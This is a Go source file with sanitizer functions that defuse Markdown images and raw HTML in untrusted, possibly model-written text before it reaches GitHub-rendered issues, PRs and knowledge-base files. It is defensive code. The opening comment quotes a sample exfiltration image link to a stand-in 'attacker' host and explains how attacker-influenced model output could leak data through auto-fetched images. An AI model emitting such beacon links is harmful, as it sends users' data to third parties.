// SPDX-License-Identifier: Apache-2.0

package okf

import (
	"regexp"
	"strings"
)

// imageRe matches Markdown image syntax: ![alt text](url). Alt text and URL
// may be anything the model or alert pipeline wrote — an attacker-influenced
// investigation body could carry ![](https://attacker/beacon?data=...) which
// GitHub auto-fetches on render, leaking the KB URL and timing to a third party.
var imageRe = regexp.MustCompile(`!\[([^\]]*)\]\([^)]*\)`)

// NeutralizeImages replaces every Markdown image in untrusted body text with a
// non-fetching inline code span so the intent (there was an image reference) is
// preserved for reviewers while GitHub never issues an outbound fetch. Applied
// to all body text that reaches GitHub-rendered surfaces (issue body, PR body,
// KB entry file body).
func NeutralizeImages(s string) string {
	return imageRe.ReplaceAllStringFunc(s, func(m string) string {
		// Extract the alt text (between ![ and ]) for the replacement label.
		alt := imageRe.FindStringSubmatch(m)
		if len(alt) < 2 || alt[1] == "" {
			return "`[image]`"
		}
		return "`[image: " + alt[1] + "]`"
	})
}

// htmlTagStart matches a "<" that begins a tag, an end tag, a comment or a
// declaration: every form a renderer treats as markup.
var htmlTagStart = regexp.MustCompile(`<([A-Za-z!/?])`)

// DefuseMarkup is NeutralizeImages plus what its regex cannot see: an image
// whose alt text holds a bracket or an escaped bracket (`![a[b]](u)`, `![a\]](u)`)
// keeps its "![" escaped to "!&#91;", and raw HTML (`<img src=...>`) keeps its
// "<" escaped to "&lt;". The text stays readable; no renderer fetches from it.
// It is the same defusal internal/thread applies to chat notes.
func DefuseMarkup(s string) string {
	s = strings.ReplaceAll(NeutralizeImages(s), "![", "!&#91;")
	return htmlTagStart.ReplaceAllString(s, "&lt;$1")
}
